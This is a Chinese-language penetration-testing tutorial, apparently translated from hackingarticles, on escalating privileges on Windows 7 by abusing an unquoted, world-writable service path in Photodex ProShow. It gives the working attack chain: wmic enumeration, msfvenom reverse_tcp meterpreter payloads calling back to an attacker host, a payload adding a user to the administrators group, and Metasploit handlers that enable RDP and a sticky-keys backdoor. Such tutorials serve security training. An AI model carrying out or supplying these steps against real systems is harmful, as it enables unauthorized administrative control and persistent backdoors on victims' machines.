**在这篇文章中，我们将给大家演示如何通过无引号服务路径来实现在Windows平台下的提权。在渗透测试的过程中，当我们以本地用户身份生成命令Shell时，我们是无法检查受限文件或目录的，因此我们才需要拿到管理员访问权。**

![1.png](https://image.3001.net/images/20180829/1535508161_5b85fec1b4b67.png!small)

## 无引号服务路径漏洞

这个漏洞跟可执行文件的路径有关，如果文件名中存在空格，或者文件路径没有包裹在双引号之中，那攻击者就可以用恶意exe文件替换掉原本合法的exe文件，并实现提权。

### 环境搭建

目标主机：Windows 7

攻击主机：Kali Linux

首先，我们需要在目标Windows系统中下载并安装一个名叫photodex proshow的包含漏洞的应用程序，下载镜像可以在[Exploit
DB](https://www.exploit-db.com/exploits/24872/)上找到。

![2.png](https://image.3001.net/images/20180829/1535508174_5b85fecec0348.png!small)

## 生成目标主机

为了拿到meterpreter会话，我们至少要成功入侵目标Windows设备一次，你可以从下图中看到，我们已经拿到了目标主机的meterpreter会话了。现在，打开命令Shell：

shell

![3.png](https://image.3001.net/images/20180829/1535508190_5b85fede96b5a.png!small)

你可以看到，我们拿到的shell访问权是本地用户local_user，为了拿到cmd的管理员权限，我们就需要提权。首先，我们可以枚举出目标主机上正在运行的所有服务，并找出那些没有被双引号包裹的服务路径，这一步可以用下列命令实现：

    
    
    wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows\\" |findstr /i /v """

这里，我们枚举出了下列路径：

    
    
    C:\ProgramFiles\Photodex\ProShow Producer\Scsiaccess.exe

这个路径没有被双引号包裹，而且文件名中也存在空格。

![4.png](https://image.3001.net/images/20180829/1535508210_5b85fef2acfad.png!small)

现在，我们需要使用下列命令识别文件目录权限：

    
    
    icacls Scsiaccess.exe

你可以看到，它给任何人都提供了写入权限，这也就意味着任何用户都可以重写该文件：

![5.png](https://image.3001.net/images/20180829/1535508225_5b85ff01937e3.png!small)

## 通过进程迁移实现提权

现在，我们只需要把恶意exe放在同一文件夹内，它就自动拥有管理员权限了，当服务重启之后，Windows将启动这个恶意exe。

在Kali Linux中打开终端，然后通过下列命令使用msfvenom生成恶意exe Payload：

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234prependmigrate=true prepenmigrateprocess=explorer.exe -f exe >/root/Desktop/scsiaccess.exe

上面的命令将在桌面生成一个恶意exe文件，然后将该文件发送给目标主机。Payload会尝试迁移恶意进程，如果用户通过进程ID终止了当前进程的运行，攻击者也不会丢失会话和Payload的控制权。

![6.png](https://image.3001.net/images/20180829/1535508248_5b85ff18b7284.png!small)

现在，用恶意exe替换掉合法的可执行文件，这里我把合法Scsiaccess.exe重命名为了Scsiaccess.exe.orginal，并将恶意Scsiaccess.exe上传到了同一文件夹内，然后重启目标主机：

    
    
    movescsiaccess.exe scsiaccess.exe.orginal
    
    upload/root/Desktop/ scsiaccess.exe

reboot：

![7.png](https://image.3001.net/images/20180829/1535508267_5b85ff2b60491.png!small)

与此同时，我在新的终端里开启了多个handler监听器来捕捉meterpreter会话：

    
    
    use exploit/multi/handler
    
    msf exploit(multi/handler) set payload windows /meterpreter/reverse_tcp
    
    msf exploit(multi/handler) set lhost 192.168.1.107
    
    msf exploit(multi/handler) set lport 1234
    
    msf exploit(multi/handler) exploit

一段时间之后，我们就能够拿到拥有管理员权限的shell了：

![8.png](https://image.3001.net/images/20180829/1535508292_5b85ff44ebb26.png!small)

## 通过添加管理员组用户来实现提权

使用local_user权限生成了shell之后，我们就可以在没有管理员权限的情况下枚举完整的用户名列表了。这里我们发现，用户raaz不是管理员组的成员：

    
    
    net user
    
    net user raaz

![9.png](https://image.3001.net/images/20180829/1535508323_5b85ff63daa69.png!small)

同样的，我们生成了一个exe文件，并用它来将用户raaz添加到了管理员组中，我们生成的恶意exe文件名还是叫Scsiaccess.exe：

    
    
    msfvenom -p windows/exec CMD='net localgroup administrators raaz /add' -f exe >/root/Desktop/scsiaccess.exe

![10.png](https://image.3001.net/images/20180829/1535508353_5b85ff813e203.png!small)

重复上述步骤，用恶意exe文件替换掉同一目录下的合法exe，然后重启目标主机：

![11.png](https://image.3001.net/images/20180829/1535508372_5b85ff9415e7c.png!small)

仔细看下面的截图，你就会发现用户raaz已经成为了管理员组成员了：

![12.png](https://image.3001.net/images/20180829/1535508380_5b85ff9c4fee0.png!small)

## 通过RDP&Sticky_key实现提权

使用msfvenom生成一个相同文件名（Scsiaccess.exe）的exe文件，然后将其发送至目标主机，同时利用自动运行脚本开启多个监听器，这样将会启用RDP服务：

    
    
    use exploit/multi/handler
    
    msf exploit(multi/handler) set payload windows /meterpreter/reverse_tcp
    
    msf exploit(multi/handler) set lhost 192.168.1.107
    
    msf exploit(multi/handler) set lport 1234
    
    msf exploit(multi/handler) set AutoRunScript post/windows/manage/enable_rdp
    
    msf exploit(multi/handler) exploit

![13.png](https://image.3001.net/images/20180829/1535508410_5b85ffbaa8419.png!small)

类似的，当目标服务重启之后，我们可以设置自动运行脚本来启用sticky_keys：

    
    
    msf exploit(multi/handler) set AutoRunScript post/windows/manage/sticky_keys
    
    msf exploit(multi/handler) run

你可以从下图中看到，命令开启了另一个meterpreter会话（session 3），这个会话拥有管理员权限，现在我们就可以通过RDP与目标主机建立连接了：

    
    
    rdp 192.168.1.101

![14.png](https://image.3001.net/images/20180829/1535508418_5b85ffc238219.png!small)

接下来，连续按下5次shift键，你将会拿到拥有管理员权限的命令行窗口：

![15.png](https://image.3001.net/images/20180829/1535508426_5b85ffca82aeb.png!small)

没错，就是这么简单！

 ***参考来源：[hackingarticles](http://www.hackingarticles.in/windows-privilege-escalation-unquoted-path-service/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

